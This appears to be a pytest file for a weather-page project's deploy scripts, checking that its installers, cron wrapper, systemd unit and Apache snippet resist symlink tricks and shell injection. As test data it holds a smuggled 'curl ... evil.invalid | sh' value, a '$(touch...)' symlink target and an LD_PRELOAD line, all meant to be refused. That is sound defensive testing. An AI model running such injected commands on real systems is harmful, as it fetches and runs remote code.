"""Tests for the fixes of the deploy audit findings: the installers (DRY_RUN=1 only, or
their functions in a harness), the systemd unit, the cron wrapper, the Apache snippet,
run_local.sh, the CI workflow and the publish check.

No network, no root. Like test_deploy.py, these run the scripts against stubs in a temp
dir; getent(1) is stubbed where a test needs the run user's home in that temp dir.
"""
from __future__ import annotations

import grp
import os
import pwd
import re
import shutil
import stat
import subprocess
import sys
from datetime import timedelta
from html.parser import HTMLParser

import pytest

from vlba import decision, page
from vlba.config import VlbaConfig
from vlba.sites import SITES
from vlba.tests import test_deploy as td
from vlba.tests import test_page as tp

ROOT, DEPLOY = td.ROOT, td.DEPLOY
CRON_INSTALLER, INSTALLER, WRAPPER = td.CRON_INSTALLER, td.INSTALLER, td.WRAPPER
ME = td.ME
MY_GROUP = grp.getgrgid(os.getgid()).gr_name
IS_ROOT = td.IS_ROOT
needs_user = pytest.mark.skipif(IS_ROOT, reason="needs an unprivileged user to install for")
INSTALLERS = ("install-cron.sh", "install.sh")


# ---- helpers -----------------------------------------------------------------------------------
def _stubbin(tmp_path, crontab=None, home=None):
    """Stubs for crontab(1) (its -l prints the bytes CRONTAB, or says "no crontab" when
    None), pgrep(1) and, with HOME, getent(1) answering this user's passwd line with that
    home directory."""
    bindir = tmp_path / "stubbin"
    if crontab is None:
        td._stub(bindir, "crontab", 'echo "no crontab for $USER" >&2; exit 1')
    else:
        fixture = tmp_path / "crontab.fixture"
        fixture.write_bytes(crontab)
        td._stub(bindir, "crontab", 'for a; do [ "$a" = -l ] && exec cat "%s"; done\n'
                                    'echo "stub crontab: refusing to write" >&2; exit 9' % fixture)
    td._stub(bindir, "pgrep", "exit 0")
    if home is not None:
        pw = pwd.getpwnam(ME)
        td._stub(bindir, "getent", 'echo "%s:x:%d:%d::%s:/bin/sh"'
                 % (ME, pw.pw_uid, pw.pw_gid, home))
    return bindir


def _install(tmp_path, script, *args, crontab=None, home=None, stdin=None, **env):
    """DRY_RUN=1 SCRIPT (install-cron.sh or install.sh) with stubs on PATH, no system env
    file, no Gentoo docroot. Returns (CompletedProcess, {preview file: bytes}, {file: mode})."""
    bindir = _stubbin(tmp_path, crontab=crontab, home=home)
    e = dict(os.environ, DRY_RUN="1", RUN_USER=ME,
             PATH="%s:%s" % (bindir, os.environ.get("PATH", "/usr/bin:/bin")),
             ENV_FILES=str(tmp_path / "absent.env"),
             SYSTEM_ENV_FILE=str(tmp_path / "absent-system.env"),
             GENTOO_DOCROOT=str(tmp_path / "no-htdocs"), LC_ALL="", LANG="C.UTF-8")
    for k in ("OUT_DIR", "CACHE_DIR", "SUDO_USER", "ETC_DIR", "UNIT_DIR"):
        e.pop(k, None)
    e.update(env)
    e = dict((k, v) for k, v in e.items() if v is not None)
    r = subprocess.run(["bash", os.path.join(DEPLOY, script)] + list(args), env=e,
                       capture_output=True, cwd=str(tmp_path), timeout=120,
                       stdin=stdin if stdin is not None else subprocess.DEVNULL)
    out = r.stdout.decode("utf-8", "replace")
    files, modes = {}, {}
    m = re.search(r"(?:preview files|rendered files) go to (\S+)", out)
    if m:
        for dirpath, _dirs, names in os.walk(m.group(1)):
            for n in names:
                p = os.path.join(dirpath, n)
                rel = os.path.relpath(p, m.group(1))
                with open(p, "rb") as f:
                    files[rel] = f.read()
                modes[rel] = stat.S_IMODE(os.stat(p).st_mode)
        shutil.rmtree(m.group(1), ignore_errors=True)
    r.stdout, r.stderr = out, r.stderr.decode("utf-8", "replace")
    return r, files, modes


def _root_owned_dir():
    """An existing directory owned by root whose ancestors are all root-owned and writable
    by nobody else (what root_safe accepts), or None."""
    for parent in ("/var/lib", "/var/cache", "/opt", "/usr/local"):
        try:
            names = sorted(os.listdir(parent))
        except OSError:
            continue
        for n in names:
            p = os.path.join(parent, n)
            try:
                st = os.lstat(p)
            except OSError:
                continue
            if not (stat.S_ISDIR(st.st_mode) and st.st_uid == 0):
                continue
            ok, d = True, p
            while d != "/":
                d = os.path.dirname(d)
                sd = os.stat(d)
                if sd.st_uid != 0 or sd.st_mode & 0o022:
                    ok = False
                    break
            if ok:
                return p
    return None


def _funcs(script, names):
    """The named shell functions of SCRIPT (those it has), for a harness."""
    text = open(os.path.join(DEPLOY, script)).read()
    return "\n".join(m.group(0) for m in re.finditer(
        r"^(%s)\(\) \{.*?^\}$" % "|".join(names), text, re.M | re.S))


def _harness(script, body, tmp_path):
    """Run BODY in bash with the directory functions of SCRIPT and a real as_run_user
    (its unprivileged branch: sh -c with the bare environment), DRY_RUN off."""
    code = "\n".join([
        'set -u',
        'die() { echo "error: $*" >&2; exit 1; }',
        'run() { echo "+ $*"; }',
        'RUN_USER=%s RUN_GROUP=%s RUN_HOME=%s DRY_RUN="" SETSID="" CRON_PATH=/usr/bin:/bin'
        % (ME, MY_GROUP, tmp_path / "home"),
        'SYSTEM_ENV_FILE=/etc/vlbaweather.env UNSAFE_PARENT=""',
        _funcs(script, ["printable", "detached", "as_run_user", "root_safe", "prepare_dir"]),
        body,
    ])
    return subprocess.run(["bash", "-c", code], capture_output=True, text=True, timeout=60)


# ---- #28: root never creates or hands over a directory through a link ----------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_default_cache_path_as_a_link_is_never_handed_over(tmp_path, script):
    """The default cache path ~RUN_USER/.cache/vlbaweather, a link the run user can plant:
    to a root-owned directory, to a target that does not exist yet, or through a link in a
    parent component. Root must never print (let alone run) install -d on the target; the
    run user's own mkdir is used instead. A plain path under root-owned parents still
    takes the root branch."""
    target = _root_owned_dir()
    if target is None:
        pytest.skip("no root-owned directory under root-owned parents here")
    home = tmp_path / "home"
    (home / ".cache").mkdir(parents=True)
    out = str(tmp_path / "www")
    link = home / ".cache" / "vlbaweather"

    link.symlink_to(target)                                  # to a root-owned directory
    r, _, _ = _install(tmp_path, script, out, home=str(home))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "+ install -d" not in r.stdout, r.stdout
    assert "+ su -s /bin/sh %s -c \"mkdir -p '%s'" % (ME, link) in r.stdout

    link.unlink()                                            # to a target not there yet
    missing = os.path.join(os.path.dirname(target), "vlbaweather-no-such-dir-%d" % os.getpid())
    link.symlink_to(missing)
    r, _, _ = _install(tmp_path, script, out, home=str(home))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "+ install -d" not in r.stdout and missing not in r.stdout.replace(str(link), "")

    link.unlink()                                            # a link in a parent component
    (home / ".cache").rmdir()
    (home / ".cache").symlink_to(target)
    r, _, _ = _install(tmp_path, script, out, home=str(home))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "+ install -d" not in r.stdout, r.stdout

    # control: no link at all; the cache in the run user's home is made by the run user,
    # and a fresh output directory under root-owned parents by root
    (home / ".cache").unlink()
    fresh = os.path.join(os.path.dirname(target), "vlbaweather-fixtest-%d" % os.getpid())
    assert not os.path.exists(fresh)
    r, _, _ = _install(tmp_path, script, fresh, home=str(home))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "+ install -d -m 0755 -o %s -g %s %s\n" % (ME, MY_GROUP, fresh) in r.stdout
    assert "mkdir -p '%s/.cache/vlbaweather'" % home in r.stdout


@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_a_link_to_a_foreign_directory_is_refused_not_chowned(tmp_path, script):
    """Through a link, prepare_dir runs as the run user: an existing directory it cannot
    write is reported as such (the chmod and the test -w really run, #24), naming the link,
    and root never runs install -d on it."""
    target = _root_owned_dir()
    if target is None:
        pytest.skip("no root-owned directory under root-owned parents here")
    link = tmp_path / "data"
    link.symlink_to(target)
    r = _harness(script, 'prepare_dir "cache dir" "%s" "/nonexistent/default"' % link, tmp_path)
    assert r.returncode != 0, r.stdout + r.stderr
    assert "+ install -d" not in r.stdout
    assert "cannot create or write cache dir %s" % link in r.stderr
    assert "%s is a symbolic link (to %s)" % (link, target) in r.stderr


# ---- #22: the resolved path is checked and quoted ---------------------------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_a_link_target_with_shell_syntax_never_runs(tmp_path, script):
    """A link whose target holds $(...) (another account's public_html, say): the resolved
    path fails the character check and nothing is executed."""
    marker = tmp_path / "PWNED"
    bob = tmp_path / "bob"
    bob.mkdir()
    (bob / "public_html").symlink_to("x$(touch${IFS}%s)" % marker)
    out = bob / "public_html" / "vlbaweather"
    r = _harness(script, 'prepare_dir "output dir" "%s" "/nonexistent/default"' % out, tmp_path)
    assert not marker.exists(), "a link target was executed as a command"
    assert r.returncode != 0
    assert "a symbolic link on the way leads to a path with characters" in r.stderr


# ---- #24: the chmod after mkdir runs ------------------------------------------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_run_user_directory_gets_mode_0755_whatever_the_umask(tmp_path, script):
    """mkdir, chmod 0755 and test -w all run: under umask 077 the directory still ends 0755."""
    d = tmp_path / "home" / "cache"
    (tmp_path / "home").mkdir()
    r = _harness(script, 'umask 077\nprepare_dir "cache dir" "%s" "/nonexistent/default"' % d,
                 tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr
    assert stat.S_IMODE(os.stat(str(d)).st_mode) == 0o755


# ---- S2: run-user code never gets root's terminal -----------------------------------------------
@needs_user
@pytest.mark.skipif(not os.path.isdir("/proc/self/fd"), reason="needs /proc")
def test_run_user_code_gets_no_stdin_and_its_own_session(tmp_path):
    """The interpreter the run user chose runs with stdin from /dev/null and, where setsid
    can wait, in a session of its own."""
    log = tmp_path / "py.log"
    py = td._stub(tmp_path / "pybin", "py-spy",
                  'echo "$(readlink /proc/$$/fd/0) $(cut -d")" -f2 /proc/$$/stat | cut -d" " -f5)"'
                  ' >> "%s"\nexec "%s" "$@"' % (log, sys.executable))
    envf = tmp_path / "user.env"
    envf.write_text("WEATHER_PYTHON=%s\n" % py)
    envf.chmod(0o644)
    r, _, _ = _install(tmp_path, "install-cron.sh", stdin=subprocess.PIPE, ENV_FILES=str(envf))
    assert r.returncode == 0, r.stdout + r.stderr
    calls = log.read_text().split("\n")
    calls = [c.split() for c in calls if c.strip()]
    assert calls and all(c[0] == "/dev/null" for c in calls), calls
    if shutil.which("setsid") and subprocess.run(["setsid", "-w", "true"]).returncode == 0:
        assert all(int(c[1]) != os.getsid(0) for c in calls), calls


# ---- #30: the crontab is filtered byte for byte ---------------------------------------------------
@needs_user
@pytest.mark.parametrize("lang", ["C.UTF-8", "en_US.UTF-8", "C"])
def test_crontab_lines_with_latin1_bytes_and_no_final_newline_are_kept(tmp_path, lang):
    keep = (b"# sauvegarde journali\xe8re\n"
            b"30 2 * * * /usr/local/bin/sauvegarde --nom journali\xe8re\n"
            b"0 3 * * * /usr/local/bin/backup.sh\n")
    old = keep + b"*/5 * * * * /old/vlbaweather/deploy/vlbaweather-cron.sh # vlbaweather\n" \
        + b"15 4 * * * /usr/local/bin/last-job.sh"              # no final newline
    r, files, _ = _install(tmp_path, "install-cron.sh", str(tmp_path / "www"),
                           crontab=old, CACHE_DIR=str(tmp_path / "cache"), LANG=lang)
    assert r.returncode == 0, r.stdout + r.stderr
    assert files["crontab"] == keep + b"15 4 * * * /usr/local/bin/last-job.sh\n" \
        + td.CRON_LINE.encode() + b"\n"


@needs_user
def test_crontab_filter_that_loses_a_line_stops_the_installer(tmp_path):
    """The count check: a grep that drops a line it should keep makes the installer stop
    before it writes anything."""
    real = shutil.which("grep")
    bindir = tmp_path / "stubbin"
    td._stub(bindir, "grep", 'case " $* " in *" -v "*) "%s" "$@" | "%s" -v DROPME; exit 0 ;; esac\n'
                             'exec "%s" "$@"' % (real, real, real))
    old = b"0 1 * * * /usr/local/bin/keep.sh\n0 2 * * * /usr/local/bin/DROPME.sh\n"
    r, files, _ = _install(tmp_path, "install-cron.sh", str(tmp_path / "www"), crontab=old,
                           CACHE_DIR=str(tmp_path / "cache"))
    assert r.returncode != 0
    assert "The crontab is left as it was" in r.stderr
    assert "crontab" not in files


# ---- S1: values shown in commands for root to paste ---------------------------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_page_url_with_shell_syntax_or_escapes_is_never_printed(tmp_path, script):
    envf = tmp_path / "site.env"
    envf.write_bytes(b"WEATHER_PAGE_URL=https://x.example.org/v/; curl -s https://evil.invalid/x | sh #\n"
                     b"WEATHER_LOG=/tmp/\x1b[1A\x1b[2Kx.log\n")
    envf.chmod(0o644)
    r, _, _ = _install(tmp_path, script, str(tmp_path / "www"), CACHE_DIR=str(tmp_path / "cache"),
                       ENV_FILES=str(envf))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "evil.invalid" not in r.stdout and "\x1b" not in r.stdout + r.stderr
    assert "WEATHER_PAGE_URL=https://x.example.org/v/; curl -s https://evil.invalid/x | sh # is not shown" \
        in r.stderr
    assert "WEATHER_PAGE_URL is not set" not in r.stdout


@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_page_url_from_a_file_others_can_change_is_not_printed(tmp_path, script):
    envf = tmp_path / "loose.env"
    envf.write_text("WEATHER_PAGE_URL=https://wx.example.org/vlbaweather/\n")
    envf.chmod(0o666)
    r, _, _ = _install(tmp_path, script, str(tmp_path / "www"), CACHE_DIR=str(tmp_path / "cache"),
                       ENV_FILES=str(envf))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "wx.example.org" not in r.stdout
    assert "WEATHER_PAGE_URL from %s is not shown: another user can change that file" % envf in r.stderr
    envf.chmod(0o644)                                         # the same file, trusted: shown
    r, _, _ = _install(tmp_path, script, str(tmp_path / "www"), CACHE_DIR=str(tmp_path / "cache"),
                       ENV_FILES=str(envf))
    assert "curl -I https://wx.example.org/vlbaweather/" in r.stdout


@needs_user
def test_log_path_shown_only_when_plain(tmp_path):
    envf = tmp_path / "site.env"
    envf.write_text("WEATHER_LOG=~/logs/vlbaweather.log\n")
    envf.chmod(0o644)
    r, _, _ = _install(tmp_path, "install-cron.sh", str(tmp_path / "www"),
                       CACHE_DIR=str(tmp_path / "cache"), ENV_FILES=str(envf))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "  logs:     ~/logs/vlbaweather.log (WEATHER_LOG from an env file)" in r.stdout


# ---- 1.7: the env file mode -----------------------------------------------------------------------
@needs_user
def test_new_env_file_is_0640_and_an_existing_one_is_never_widened(tmp_path):
    r, files, modes = _install(tmp_path, "install-cron.sh", str(tmp_path / "www"),
                               CACHE_DIR=str(tmp_path / "cache"),
                               SYSTEM_ENV_FILE=str(tmp_path / "new.env"))
    assert r.returncode == 0, r.stdout + r.stderr
    assert modes["vlbaweather.env"] == 0o640
    assert "new file   %s, mode 0640, owner root, group %s" % (tmp_path / "new.env", MY_GROUP) \
        in r.stdout
    code = td._code_lines(td._read("deploy", "install-cron.sh"))
    assert 'install -m 0640 -o root -g "$RUN_GROUP" /dev/null "$dest"' in code
    assert "chmod 0644" not in code

    system = tmp_path / "system.env"
    system.write_text("WEATHER_OUT_DIR=%s\nWEATHER_CACHE_DIR=%s\n" % (tmp_path / "www", tmp_path / "c"))
    for mode, hint in ((0o600, False), (0o640, False), (0o644, True)):
        system.chmod(mode)
        r, files, modes = _install(tmp_path, "install-cron.sh", SYSTEM_ENV_FILE=str(system),
                                   ENV_FILES=str(system))
        assert r.returncode == 0, r.stdout + r.stderr
        assert modes["vlbaweather.env"] == mode
        assert ("is readable by every local account" in r.stderr) is hint, r.stderr
        assert "cannot read" not in r.stderr


# ---- #25 / #32: nothing private inside the public output directory -----------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_cache_state_lock_and_log_never_inside_the_output_directory(tmp_path, script):
    pub = tmp_path / "pub"
    cases = [dict(CACHE_DIR=str(pub)), dict(CACHE_DIR=str(pub / "cache")),
             dict(CACHE_DIR=str(tmp_path))]                  # the output dir inside the cache
    for env in cases:
        r, _, _ = _install(tmp_path, script, str(pub), **env)
        assert r.returncode != 0 and "overlap" in r.stderr, (env, r.stdout + r.stderr)
    keys = ["VLBA_STATE_FILE", "WEATHER_LOCK_FILE"] + (["WEATHER_LOG"] if script == "install-cron.sh" else [])
    for key in keys:
        envf = tmp_path / "k.env"
        envf.write_text("%s=%s/x\n" % (key, pub))
        envf.chmod(0o644)
        r, _, _ = _install(tmp_path, script, str(pub), CACHE_DIR=str(tmp_path / "cache"),
                           ENV_FILES=str(envf))
        assert r.returncode != 0 and "%s=%s/x lies in the output directory" % (key, pub) in r.stderr, \
            (key, r.stderr)
    r, _, _ = _install(tmp_path, script, str(pub), CACHE_DIR=str(tmp_path / "cache"))   # control
    assert r.returncode == 0, r.stdout + r.stderr


# ---- #31: a checkout the run user or others can change ------------------------------------------
@needs_user
@pytest.mark.parametrize("script", INSTALLERS)
def test_installers_warn_about_a_checkout_others_can_change(tmp_path, script):
    r, _, _ = _install(tmp_path, script, str(tmp_path / "www"), CACHE_DIR=str(tmp_path / "cache"))
    assert r.returncode == 0 and "can change these" not in r.stderr, r.stderr
    # the checkout belongs to the run user, and root was called by another administrator
    r, _, _ = _install(tmp_path, script, str(tmp_path / "www"), CACHE_DIR=str(tmp_path / "cache"),
                       SUDO_USER="admin-example")
    assert r.returncode == 0, r.stderr
    assert "or other accounts can change these" in r.stderr and "%s (owner %s" % (ROOT, ME) in r.stderr
    # a group-writable deploy directory in a copy of the checkout
    copy = tmp_path / "checkout"
    shutil.copytree(DEPLOY, str(copy / "deploy"))
    shutil.copytree(os.path.join(ROOT, "weather"), str(copy / "weather"),
                    ignore=shutil.ignore_patterns("tests", "__pycache__"))
    shutil.copy2(os.path.join(ROOT, "make_vlba_page.py"), str(copy / "make_vlba_page.py"))
    (copy / "deploy").chmod(0o775)
    bindir = _stubbin(tmp_path)
    e = dict(os.environ, DRY_RUN="1", RUN_USER=ME, PATH="%s:%s" % (bindir, os.environ["PATH"]),
             ENV_FILES=str(tmp_path / "absent.env"), SYSTEM_ENV_FILE=str(tmp_path / "absent-system.env"),
             GENTOO_DOCROOT=str(tmp_path / "no-htdocs"), CACHE_DIR=str(tmp_path / "cache"))
    e.pop("SUDO_USER", None)
    r = subprocess.run(["bash", str(copy / "deploy" / script), str(tmp_path / "www")], env=e,
                       capture_output=True, text=True, cwd=str(tmp_path), timeout=120)
    m = re.search(r"(?:preview files|rendered files) go to (\S+)", r.stdout)
    if m:
        shutil.rmtree(m.group(1), ignore_errors=True)
    assert r.returncode == 0, r.stderr
    assert "%s/deploy (owner %s, mode 775)" % (copy, ME) in r.stderr


# ---- #29 / #36 / #150 / #9: the systemd unit ------------------------------------------------------
def _unit_problems(text):
    """Why a unit lets the run user's environment reach a command that starts as root."""
    s = td._unit(text)["Service"]
    privileged = [v for k, vs in s.items() if k.startswith("Exec") for v in vs
                  if re.match(r"^[-@:]*[+!]", v)]
    if not privileged:
        return []
    bad = []
    for v in s.get("EnvironmentFile", []):
        path = v.lstrip("-")
        if not path.startswith("/etc/") or "__" in path:
            bad.append("EnvironmentFile=%s with %s" % (v, privileged))
    return bad


def test_unit_never_feeds_a_run_user_file_to_a_root_command():
    """systemd applies EnvironmentFile= to every command, the "+" ExecStartPre= included,
    which starts as root: only root-owned files under /etc may be loaded."""
    text = td._read("deploy", "vlbaweather.service")
    assert _unit_problems(text) == []
    # the check itself catches the audited shape
    assert _unit_problems(text.replace("EnvironmentFile=-/etc/vlbaweather.env",
                                       "EnvironmentFile=-/etc/vlbaweather.env\n"
                                       "EnvironmentFile=-__HOME__/vlbaweather.env"))


def test_unit_sandbox_memory_and_clock_ordering(monkeypatch):
    for k in list(os.environ):
        if k.startswith(("WEATHER_", "VLBA_")):
            monkeypatch.delenv(k)
    u = td._unit(td._read("deploy", "vlbaweather.service"))
    s = u["Service"]
    assert s["ProtectSystem"] == ["strict"] and s["ProtectHome"] == ["read-only"]
    assert "PYTHONNOUSERSITE=1" in s["Environment"]
    assert s["MemoryMax"] == ["2G"]
    assert "time-sync.target" in " ".join(u["Unit"]["After"])
    assert "time-sync.target" not in " ".join(u["Unit"].get("Wants", []))   # ordered after, not pulled in
    rw = " ".join(s["ReadWritePaths"]).split()
    assert rw == ["-__OUT_DIR__", "-__CACHE_DIR__"]
    # everything the generator writes by default lies in those two holes
    c = VlbaConfig.from_env(out_dir="/srv/example/out", cache_dir="/srv/example/cache")
    for path in (c.state_file, c.lock_file):
        assert path.startswith("/srv/example/cache/"), path


@needs_user
def test_install_sh_renders_no_home_env_file_and_warns_about_one(tmp_path):
    home = tmp_path / "home"
    home.mkdir()
    (home / "vlbaweather.env").write_text("WEATHER_TITLE=x\n")
    r, files, _ = _install(tmp_path, "install.sh", str(tmp_path / "www"), home=str(home),
                           CACHE_DIR=str(tmp_path / "cache"))
    assert r.returncode == 0, r.stdout + r.stderr
    unit = files["vlbaweather.service"].decode()
    assert _unit_problems(unit) == [] and str(home) + "/vlbaweather.env" not in unit
    assert "%s/vlbaweather.env exists, but it is no longer read under systemd" % home in r.stderr
    assert "Move its settings to /etc/vlbaweather.env" in r.stderr


# ---- the cron wrapper: #34, #35, #65 -----------------------------------------------------------------
def _shells():
    out = [os.environ.get("LWA_TEST_SH", "/bin/sh")]
    if shutil.which("dash") and "dash" not in out[0]:
        out.append(shutil.which("dash"))
    return out


def _wrap(tmp_path, shell, **extra):
    env = td._wrapper_env(tmp_path, **extra)
    return subprocess.run(shell.split() + [WRAPPER], env=env, cwd=str(tmp_path),
                          capture_output=True, text=True, timeout=60)


@td.needs_non_root
@pytest.mark.skipif(not shutil.which("timeout"), reason="timeout(1) not installed")
@pytest.mark.parametrize("shell", _shells())
def test_wrapper_timeout_out_of_range_falls_back_to_600(tmp_path, shell):
    bindir = tmp_path / "tbin"
    args = tmp_path / "timeout.args"
    td._stub(bindir, "timeout", 'echo "$1" >> "%s"\nshift\nexec "$@"' % args)
    path = "%s:%s" % (bindir, os.environ.get("PATH", "/usr/bin:/bin"))
    for value, used, msg in (("99999999999999999999", "600", True), ("3600", "600", True),
                             ("1800", "1800", False), ("0300", "300", False), ("0", None, False)):
        if args.exists():
            args.unlink()
        r = _wrap(tmp_path, shell, PATH=path, WEATHER_TIMEOUT=value)
        assert r.returncode == 0, (value, r.stdout + r.stderr)
        got = args.read_text().split() if args.exists() else []
        assert got == ([used] if used else []), (value, got)
        assert ("longer than the 1800 s cron interval; using 600" in r.stdout) is msg, r.stdout
        assert "integer expression expected" not in r.stderr


@td.needs_non_root
@pytest.mark.parametrize("shell", _shells())
def test_wrapper_skips_env_files_others_can_change(tmp_path, shell):
    good = tmp_path / "good.env"
    good.write_text("WEATHER_FROM_GOOD=1\n")
    good.chmod(0o644)
    loose = tmp_path / "loose.env"
    loose.write_text("WEATHER_FROM_LOOSE=1\nLD_PRELOAD=/nonexistent/x.so\n")
    loose.chmod(0o666)
    shared = tmp_path / "shared"
    shared.mkdir()
    shared.chmod(0o777)
    in_shared = shared / "in.env"
    in_shared.write_text("WEATHER_FROM_SHARED=1\n")
    in_shared.chmod(0o644)
    r = _wrap(tmp_path, shell, ENV_FILES="%s %s %s" % (good, loose, in_shared))
    assert r.returncode == 0, r.stdout + r.stderr
    got = td._stub_output(r.stdout)["env"]
    assert got.get("WEATHER_FROM_GOOD") == "1"
    assert "WEATHER_FROM_LOOSE" not in got and "WEATHER_FROM_SHARED" not in got
    assert "vlbaweather-cron: skipped the env file %s" % loose in r.stdout
    assert "vlbaweather-cron: skipped the env file %s" % in_shared in r.stdout
    assert "LD_PRELOAD" not in r.stderr


@td.needs_non_root
@pytest.mark.parametrize("shell", _shells())
def test_wrapper_stops_on_an_env_file_it_cannot_read(tmp_path, shell):
    unreadable = tmp_path / "secret.env"
    unreadable.write_text("WEATHER_OUT_DIR=/srv/example\n")
    unreadable.chmod(0o000)
    try:
        if os.access(str(unreadable), os.R_OK):
            pytest.skip("this user can read a mode-000 file")
        r = _wrap(tmp_path, shell, ENV_FILES=str(unreadable))
    finally:
        unreadable.chmod(0o600)
    assert r.returncode == 2, r.stdout + r.stderr
    assert "STUB-OUT" not in r.stdout, "the generator must not run on defaults"
    assert "cannot read the env file %s" % unreadable in r.stdout
    r = _wrap(tmp_path, shell, ENV_FILES=str(tmp_path / "missing.env"))      # absent: silent
    assert r.returncode == 0 and "env file" not in r.stdout, r.stdout


# ---- #6 / #37: the Apache snippet -------------------------------------------------------------------
def _snippet_code():
    conf = td._read("deploy", "apache-vlbaweather.conf")
    return "\n".join(ln for ln in conf.splitlines() if not ln.lstrip().startswith("#"))


def test_apache_options_are_absolute():
    opts = re.findall(r"^\s*Options\s+(.*)$", _snippet_code(), re.M)
    assert opts == ["SymLinksIfOwnerMatch"]


def test_apache_serves_only_what_a_run_writes():
    code = _snippet_code()
    deny = re.findall(r'<FilesMatch "([^"]+)">\s*Require all denied\s*</FilesMatch>', code)
    assert len(deny) == 1
    rx = re.compile(deny[0])                       # PCRE; Python's re reads this one alike
    cfg = VlbaConfig.from_env(out_dir="/srv/example/out", cache_dir="/srv/example/cache")
    written = ["index.html", "status.json"] + [cfg.map_basename(s["slug"], theme)
                                               for s in SITES for theme, _ in cfg.themes]
    for name in written + [""]:                    # "": the directory itself (DirectoryIndex)
        assert not rx.search(name), name
    for name in ("cron.log", "vlba_state.json", "run.lock", "x.php", "index.html.tmp.42",
                 "radar_pt_dark.png.tmp.42", "status.json.1", ".htaccess", "cache",
                 "radar_x.php.png", "radar_x.cgi.png", "radar_.png"):
        assert rx.search(name), name
    assert "RedirectMatch 301 ^/vlbaweather$ /vlbaweather/" in code
    # nothing in the directory is ever run by a handler configured elsewhere (#37)
    assert re.search(r'<Directory "__OUT_DIR__">[^<]*\n    SetHandler default-handler\n', code)


def _csp():
    m = re.search(r'Header always set Content-Security-Policy "([^"]+)"', _snippet_code())
    assert m
    out = {}
    for part in m.group(1).split(";"):
        words = part.split()
        if words:
            out[words[0]] = words[1:]
    return out


class _Loads(HTMLParser):
    """What a browser would load for this page: src/data-src/srcset of any element, href of
    <link>, and the elements a policy has to account for."""

    def __init__(self):
        super().__init__()
        self.urls, self.tags, self.inline_scripts = [], set(), 0

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        self.tags.add(tag)
        for k in ("src", "data-src", "srcset", "poster", "background"):
            if a.get(k):
                self.urls.append(a[k])
        if tag == "link" and a.get("href"):
            self.urls.append(a["href"])
        if tag == "script" and not a.get("src"):
            self.inline_scripts += 1


def _allowed(url, sources):
    if url.startswith("data:"):
        return "data:" in sources
    m = re.match(r"^(https?)://([^/?#]+)", url)
    if m:
        return "%s://%s" % (m.group(1), m.group(2)) in sources
    return "'self'" in sources                      # a relative URL: this server


def _vlba_run():
    """The full run of vlba/tests/test_page.py, with NWS forecast icons in it."""
    pt = next(dict(s) for s in SITES if s["slug"] == "pt")
    mk = next(dict(s) for s in SITES if s["slug"] == "mk")
    e_pt = tp._site_entry(pt, tp._verdict(decision.GOOD), sun_alt=35.0)
    e_pt["alerts_at"] = [tp._alert(web="https://alerts.weather.gov/x")]
    for p in e_pt["forecast"]["periods"]:
        p["icon"] = "https://api.weather.gov/icons/land/day/few?size=medium"
    e_mk = tp._site_entry(mk, tp._verdict(decision.GOOD), sun_alt=-12.0, maps_ok=False)
    gen = tp.GEN
    return {"generated": gen, "generated_ts": gen.timestamp(), "night_default": True,
            "alerts": dict(tp._status(), fetched_ts=gen.timestamp(), alerts=[tp._alert()], count_raw=1),
            "radar": dict(tp._status(), ts=tp.FRAME_TS, url="https://iem.example/f.png"),
            "glm": dict(tp._status(), window_start=gen - timedelta(minutes=5), window_end=gen,
                        flash_count=0, sats={}, deps=True, elapsed_s=1.0, skipped=None, partial=False),
            "network": {"budget_s": 150, "left_s": 100.0, "exhausted": False, "down_hosts": []},
            "errors": [], "sites": [e_pt, e_mk],
            "summary": {"good": 2, "bad": 0, "no_data": 0, "incomplete": 0}}


def test_csp_allows_exactly_what_the_page_loads(cfg):
    """Render the VLBA page and hold every resource it would load against the snippet's
    policy, so the page and the policy cannot drift apart."""
    csp = _csp()
    assert csp["default-src"] == ["'none'"]
    for d in ("base-uri", "form-action", "frame-ancestors"):
        assert csp[d] == ["'none'"], d
    html = page.render_html(cfg, _vlba_run())
    p = _Loads()
    p.feed(html)
    assert p.urls, "the page loads nothing? the parser missed the images"
    for url in p.urls:
        assert _allowed(url, csp.get("img-src", [])), url
    assert any(u.startswith("https://api.weather.gov/") for u in p.urls)
    assert not {"iframe", "frame", "object", "embed", "form", "link", "base"} & p.tags, p.tags
    assert "connect-src" not in csp                  # the script fetches nothing
    assert not re.search(r"\b(fetch|XMLHttpRequest|WebSocket|EventSource)\b", html)
    if p.inline_scripts:
        assert "'unsafe-inline'" in csp["script-src"]
    assert not re.search(r"<script[^>]*\ssrc=", html)
    if "<style" in html or "style=" in html:
        assert "'unsafe-inline'" in csp["style-src"]
    assert not re.search(r"url\((?!['\"]?data:)", html), "a CSS url() the policy does not know"
    conf = _snippet_code()
    for h in ('X-Content-Type-Options "nosniff"', 'Referrer-Policy "no-referrer"'):
        assert "Header always set %s" % h in conf


# ---- #33: run_local.sh INTERVAL --------------------------------------------------------------------
@td.needs_bash
@pytest.mark.parametrize("interval", ["abc", "0", "30m", "59", "-5", "0.5h"])
def test_run_local_refuses_an_unusable_interval(local_env, interval):
    env, tmp = local_env
    env = dict(env, INTERVAL=interval)
    log = tmp / "run_local.log"
    # output to a file, not a pipe: a server or loop left running must not hold this test
    with open(str(log), "wb") as out:
        proc = subprocess.Popen(["bash", td.RUN_LOCAL, str(td._free_port()), str(tmp / "out")],
                                env=env, stdout=out, stderr=subprocess.STDOUT, start_new_session=True)
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        pytest.fail("run_local.sh started with INTERVAL=%s" % interval)
    finally:
        td._cleanup(proc, tmp / "gen.pids")       # its traps stop the loop and the server
    text = log.read_text()
    assert proc.returncode == 2, text
    assert "INTERVAL must be a whole number of seconds, at least 60" in text
